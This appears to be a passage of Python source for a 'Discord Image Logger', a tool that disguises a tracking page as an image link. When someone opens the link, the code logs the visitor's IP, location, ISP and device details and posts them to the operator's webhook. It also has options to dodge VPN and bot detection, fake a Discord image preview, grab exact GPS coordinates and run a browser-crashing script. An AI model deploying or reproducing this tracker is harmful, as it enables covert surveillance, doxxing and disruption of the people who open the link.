rXwMHrG3pFLDnrFyJQULOCK08vS3q0e4qUVEqJdRLksByoAwFABAO2MZNlLBQEsoOXcjMDXWlPnCrEbfxJsmWPIn5w0vIzFGwDgxlisIm583tc+zN7wk2jtSUknJvE8Gyg+QAZ9AOUA4sTplZiyRcPbyA+kRjDAaOeJ+n19I+5nowOZAEqmKzqcjU/IQQBpDXZ+GBlkm5JrrS3zpzhck7xhffuJHlKq0ejrVz/1NpSKwywchgVG55NTQfOA8CjMQbpHueENVTE5inVrV+cCtPOBH9GoI3t8Is21LJl6bpB+Ip6iEIMP9tL3GY1IA4UqXPy+kCSSGYpLcGvG6WwsT7QQNfwfAQXDz8qknQEP0i0I2mCNwvz0iqz5YBpaPcDishY2MGcbhmIVOamxLTPXmYHh8YVY5kqAcsGfVhq3vaJZWMK0hT6MHGgdhRvWA5k1BWCpLJ1Bch25VZ4UCkGUXtVhx/ciVNAUQglQ0LEFukFIn0pAUqflKikHKSwbhwjZBLvYGoH3rBwDFGcDkmMcFI7xTEtqdLdYIkS0OQlYIcso2bj/ABCebNe8bS5x4x4amJzmaXUoBjb8Y0xMgIBYhT2Lt7QKlTijAi8DzZpVrXjEEkOou4bTj+0ehJ814znwkyjHgjF1qPaMBEF2CKm9s8QLxOVRKMepglYC0jRVx0VcesZGRs9IJSQZEnElKsyN2rjVuXOHOztphSkmaoJDEU11PQcjz4x7GQKysOMGFrcocia7S2+onJJUQn9T7x6FqDpC1F3jyMjC1LWMKIcWs53NJ0mJSzAnp6RkZGk4YTdvNJka1ueAhwdhSzJChNBmuypZBBQd5n0qU9aigjIyPNQ7KCRN9n0JYwDjOfwPv4TOzxCUBQoVXhxLmZKks+guev7xkZGG5aLpwsnG0iQasOAtyfjGSp7MOAbhHkZH2OZ8SdslmT3q9RES5xNQXjIyPZiLtszFGW92I68Pn7wqSoRkZDNPSKaj1hNsUBupFzU8eA+cDJngCZuJVnBDqd01O8nn+0eRkEMCIbsWaCCh94G3EXB925QPiML/AHVBNgXPJxX4xkZEy3KWHE6vRkX6dA46cfIQrDS0pAAI9fpDBTNVmAqSaDnWMjIXbO4DPWVUIFTEDoJWdpYoLXlST3YNKXOp58jE+BkKXupJUeTR5GQ3f/HWSPCc5Sxuu73/AFDFSUjdU6TzA+IhbjMEQ5agjIyMVOcA56zN6Lkr5QGXPKQwtpyMTd64d4yMhsgGJK5HEIwElJfNoaVLdaQQrDRkZGwOIJzkyGZh4gKGj2Mj3EzmaVjFTDf1jIyPp7mTpMbBEZGR9PJ//9k=", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
